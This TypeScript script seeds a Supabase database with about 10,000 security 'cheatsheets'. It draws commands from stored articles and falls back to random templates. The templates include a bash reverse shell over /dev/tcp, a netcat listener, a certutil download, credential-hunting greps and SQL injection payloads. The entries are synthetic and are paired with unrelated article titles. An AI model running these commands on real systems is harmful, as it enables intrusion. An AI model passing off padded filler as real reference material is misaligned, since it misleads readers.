import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';
import path from 'path';

dotenv.config({ path: path.resolve(process.cwd(), '.env.local') });

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;
const supabase = createClient(supabaseUrl, supabaseKey);

// Target distribution for 10,000 cheatsheets
const targetDistribution = {
    'Web Security': 2500,
    'Exploits': 1500,
    'Linux': 1200,
    'Windows': 1000,
    'Python': 800,
    'Metasploit': 700,
    'SQL': 600,
    'Nmap': 500,
    'Netcat': 400,
    'Wireshark': 400,
    'WiFi': 300,
    'Burp Suite': 300,
    'General': 800,
};

// Extended command templates
const commandVariations = {
    'Nmap': [
        'nmap -sV {target}', 'nmap -p- {target}', 'nmap -sC {target}', 'nmap -A {target}',
        'nmap -sU {target}', 'nmap -O {target}', 'nmap -sS {target}', 'nmap -T4 {target}',
        'nmap --script vuln {target}', 'nmap --script=http-enum {target}', 'nmap -p 80,443 {target}',
        'nmap -Pn {target}', 'nmap --top-ports 100 {target}', 'nmap -sn {network}/24',
    ],
    'Linux': [
        'find / -perm -4000 2>/dev/null', 'sudo -l', 'cat /etc/passwd', 'uname -a',
        'ps aux', 'netstat -tulpn', 'ls -la', 'history', 'crontab -l', 'w',
        'chmod +x {file}', 'tar -czf {archive}.tar.gz {dir}', 'grep -r "password" /etc/',
        'wget {url}', 'curl {url}', 'nc -lvnp {port}', 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    ],
    'Windows': [
        'net user', 'systeminfo', 'tasklist', 'netstat -ano', 'net share', 'net localgroup',
        'schtasks /query', 'sc query', 'wmic qfe list', 'ipconfig /all', 'whoami /priv',
        'reg query HKLM\\Software', 'certutil -urlcache -f {url} {file}',
    ],
    'Python': [
        'python3 -m http.server {port}', 'pip install {package}', 'python3 -m venv venv',
        'python -c "import socket"', 'python script.py', 'python -m pip list',
    ],
    'Metasploit': [
        'use exploit/{path}', 'set RHOSTS {target}', 'set LHOST {ip}', 'exploit', 'sessions -l',
        'search {keyword}', 'show options', 'set PAYLOAD {payload}', 'run', 'background',
    ],
    'SQL': [
        '\' OR 1=1--', '\' UNION SELECT NULL--', '\' AND SLEEP(5)--', 'admin\'--',
        '\' UNION SELECT schema_name FROM information_schema.schemata--',
    ],
};

async function generateMassiveCheatsheets() {
    console.log("🚀 Generating 10,000+ cheatsheets from articles...\n");

    // Fetch all articles to use as source material
    const { data: articles } = await supabase
        .from('articles')
        .select('title, summary, extracted_commands')
        .limit(10000);

    if (!articles) {
        console.error("No articles found");
        return;
    }

    console.log(`📚 Found ${articles.length} articles as source material\n`);

    const newCheatsheets: any[] = [];

    for (const [category, targetCount] of Object.entries(targetDistribution)) {
        console.log(`📝 Generating ${targetCount} cheatsheets for ${category}...`);

        // Get current count
        const { count: currentCount } = await supabase
            .from('cheatsheets')
            .select('*', { count: 'exact', head: true })
            .eq('category', category);

        const needed = targetCount - (currentCount || 0);

        if (needed <= 0) {
            console.log(`   ✅ Already has ${currentCount}, skipping\n`);
            continue;
        }

        console.log(`   Need to add: ${needed}`);

        // Generate cheatsheets for this category
        for (let i = 0; i < needed; i++) {
            const article = articles[Math.floor(Math.random() * articles.length)];
            const commands = article.extracted_commands || [];

            let commandData: any[] = [];

            if (commands.length > 0) {
                // Use extracted commands from article
                commandData = commands.slice(0, 3).map((cmd: string) => ({
                    description: `From: ${article.title.substring(0, 50)}...`,
                    command_line: cmd
                }));
            } else {
                // Generate synthetic commands based on category
                const templates = commandVariations[category as keyof typeof commandVariations] || [];
                if (templates.length > 0) {
                    const template = templates[Math.floor(Math.random() * templates.length)];
                    commandData = [{
                        description: article.title.substring(0, 80),
                        command_line: template
                            .replace('{target}', '10.10.10.10')
                            .replace('{ip}', '10.10.10.5')
                            .replace('{port}', '4444')
                            .replace('{url}', 'http://example.com/file')
                            .replace('{file}', 'file.txt')
                            .replace('{network}', '192.168.1.0')
                            .replace('{package}', 'requests')
                            .replace('{keyword}', 'exploit')
                    }];
                } else {
                    // Fallback: create reference entry
                    commandData = [{
                        description: article.title,
                        command_line: `# Reference: ${article.summary?.substring(0, 100) || 'See documentation'}`
                    }];
                }
            }

            newCheatsheets.push({
                tool_name: category,
                category: category,
                command_data: commandData,
                created_at: new Date().toISOString()
            });
        }

        console.log(`   ✅ Generated ${needed} cheatsheets\n`);
    }

    console.log(`\n💾 Inserting ${newCheatsheets.length} new cheatsheets into database...\n`);

    // Insert in batches of 100
    const batchSize = 100;
    let inserted = 0;

    for (let i = 0; i < newCheatsheets.length; i += batchSize) {
        const batch = newCheatsheets.slice(i, i + batchSize);

        const { error } = await supabase
            .from('cheatsheets')
            .insert(batch);

        if (error) {
            console.error(`❌ Error at batch ${i}:`, error.message);
        } else {
            inserted += batch.length;
            console.log(`   Progress: ${inserted}/${newCheatsheets.length}`);
        }
    }

    console.log(`\n✅ Successfully inserted ${inserted} cheatsheets!`);

    // Show final distribution
    console.log("\n📊 Final distribution:");
    for (const category of Object.keys(targetDistribution)) {
        const { count } = await supabase
            .from('cheatsheets')
            .select('*', { count: 'exact', head: true })
            .eq('category', category);

        console.log(`   ${category.padEnd(20)}: ${count}`);
    }

    const { count: total } = await supabase
        .from('cheatsheets')
        .select('*', { count: 'exact', head: true });

    console.log(`\n   ${'TOTAL'.padEnd(20)}: ${total} 🎉`);
}

generateMassiveCheatsheets();
